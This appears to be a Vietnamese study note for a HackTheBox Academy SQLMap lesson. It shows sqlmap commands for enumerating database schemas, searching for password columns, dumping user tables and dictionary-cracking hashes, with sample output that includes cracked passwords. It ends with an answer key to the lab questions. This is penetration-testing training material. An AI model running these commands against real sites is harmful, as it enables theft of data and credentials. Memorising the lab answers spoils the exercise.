# Kỹ Thuật Thu Thập CSDL Nâng Cao (Advanced Database Enumeration)

> **HTB Academy Module 58: SQLMap Essentials - Section 8 / 11**  
> *Đường dẫn bài học: `03-database-enumeration/02-advanced-database-enumeration.md`*

---

## 1. Trích Xuất Toàn Bộ Cấu Trúc Cơ Sở Dữ Liệu (`--schema`)

Khi đối mặt với một hệ thống CSDL doanh nghiệp phức tạp có hàng chục database và hàng trăm bảng, việc dump toàn bộ dữ liệu sẽ gây nghẽn mạng và bị phát hiện. Thay vào đó, Pentester sẽ dùng cờ **`--schema`** để trích xuất sơ đồ kiến trúc (Database Architecture) bao gồm tên bảng, tên cột và kiểu dữ liệu tương ứng:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema --batch
```

### Đầu Ra Mẫu (Schema Output):
```console
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

---

## 2. Tìm Kiếm Thông Minh Bằng Từ Khóa (`--search`)

Thay vì phải duyệt thủ công hàng trăm bảng, cờ **`--search`** cho phép sử dụng toán tử `LIKE` để truy lùng nhanh các định danh nhạy cảm.

### 2.1. Tìm Kiếm Tên Bảng Chứa Từ Khóa (`--search -T`)
Ví dụ: Tìm tất cả các bảng có tên chứa chữ `user`:
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user --batch
```
```text
[INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+
Database: master
[1 table]
+-----------------+
| users           |
+-----------------+
Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+
```

### 2.2. Tìm Kiếm Tên Cột Chứa Từ Khóa (`--search -C`)
Ví dụ: Tìm tất cả các cột liên quan đến mật khẩu (`pass`) hoặc định dạng đặc biệt (`style`):
```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass --batch
```
```text
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+
Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+
```

---

## 3. Tự Động Nhận Diện & Bẻ Khóa Băm Mật Khẩu (Password Cracking)

Một trong những tính năng bá đạo nhất của SQLMap là **tự động bẻ khóa mật khẩu (Dictionary-based Hash Cracking)** ngay trong quá trình dump:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users --batch
```

### Cơ Chế Xử Lý Của SQLMap:
1. **Nhận diện định dạng hash**: Khi thấy một cột chứa chuỗi có độ dài và ký tự giống mã băm (MD5, SHA-1, SHA-256, MySQL 41-char...), SQLMap sẽ nhận diện thuật toán băm (ví dụ: `sha1_generic_passwd`).
2. **Kích hoạt tấn công từ điển**: SQLMap tự động hỏi có muốn crack bằng từ điển hay không.
3. **Tận dụng đa tiến trình (Multi-processing)**: Tự động phát hiện số nhân CPU của máy bạn (ví dụ: `starting 8 processes`) để tăng tốc độ bẻ khóa song song.
4. **Bộ từ điển tích hợp**: Đi kèm file từ điển đồ sộ chứa **1.4 triệu mật khẩu thông dụng** (`data/txt/wordlist.tx_`) được tổng hợp từ các vụ rò rỉ dữ liệu lớn trên thế giới.

```console
[INFO] starting dictionary-based cracking (sha1_generic_passwd)
[INFO] starting 8 processes
[INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
[INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
```

* Bảng kết quả in ra sẽ tự động điền mật khẩu dạng chữ rõ (clear-text) ngay cạnh chuỗi hash trong ngoặc đơn:
```text
| 6 | Kimberly Wright | KimberlyMWright@gmail.com | ... | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) |
```

---

## 4. Trích Xuất Tài Khoản Hệ Quản Trị CSDL (`--passwords`)

Để trích xuất các tài khoản quản trị database cấp hệ thống (như `root@localhost`, `debian-sys-maint` trong bảng `mysql.user`):

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
```text
database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

> [!TIP]
> Cờ **`--all --batch`**: Tự động hóa toàn bộ quá trình thu thập mọi thứ có thể truy cập được trên mục tiêu (từ banner, cấu hình, user, password đến toàn bộ schema và tables). Lưu ý cờ này có thể chạy rất lâu trên các hệ thống lớn.

---

## 5. Hướng Dẫn Giải Chi Tiết Các Bài Lab Tương Tác (HTB Case #1)

---

### 🎯 Case #1 - Câu Hỏi 1: Tìm Tên Cột Chứa Chữ "style"
* **Đề bài**: *What's the name of the column containing "style" in it's name? (Case #1)*
* **Lệnh tìm kiếm bằng SQLMap**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case1.php?id=1" --search -C style --batch
  ```
* **Kết quả tìm kiếm**:
  SQLMap quét qua cấu trúc các bảng hệ thống và tìm thấy cột trong `information_schema.PARAMETERS`:
  ```text
  Database: information_schema
  Table: PARAMETERS
  [1 column]
  +-----------------+
  | Column          |
  +-----------------+
  | PARAMETER_STYLE |
  +-----------------+
  ```
* 👉 **Đáp án Question 1**: `PARAMETER_STYLE`

---

### 🎯 Case #1 - Câu Hỏi 2: Mật Khẩu Đã Crack Của Người Dùng Kimberly
* **Đề bài**: *What's the Kimberly user's password? (Case #1)*
* **Lệnh trích xuất và bẻ khóa bảng users**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case1.php?id=1" -D master -T users --dump --batch
  ```
* **Kết quả trích xuất**:
  * Tài khoản: `Kimberly Wright`
  * Email: `KimberlyMWright@gmail.com`
  * Hash SHA-1: `d642ff0feca378666a8727947482f1a4702deba0`
  * Mật khẩu giải mã thành công: `Enizoom1609`
* 👉 **Đáp án Question 2**: `Enizoom1609`

---

## 6. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Kỹ Thuật Khai Thác | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the name of the column containing "style" in it's name? (Case #1)* | Tìm kiếm tên cột thông minh (`--search -C style`) | **`PARAMETER_STYLE`** |
| **Q2** | *What's the Kimberly user's password? (Case #1)* | Trích xuất và bẻ khóa từ điển hash (`-D master -T users --dump`) | **`Enizoom1609`** |

---
*Edit by me and AI.*
